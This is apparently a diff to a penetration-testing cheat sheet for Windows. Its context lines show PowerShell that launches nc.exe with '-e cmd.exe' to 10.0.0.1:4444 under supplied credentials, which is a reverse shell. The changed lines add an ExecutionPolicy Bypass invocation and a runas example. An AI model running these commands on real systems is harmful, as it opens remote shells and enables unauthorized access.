@@ -65,10 +65,13 @@ $secpasswd = ConvertTo-SecureString "passwordhere" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("usernamehere", $secpasswd)
 $computer = "Hostnamehere"
  [System.Diagnostics.Process]::Start("c:\temp\nc.exe","10.0.0.1 4444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
-```
-- execute as
-```
+
+# execute
 powershell -ExecutionPolicy Bypass -File c:\temp\change_user.ps1
 ```
 
+- run as other user
+```
+runas /user:domain\user cmd.exe
+```
 
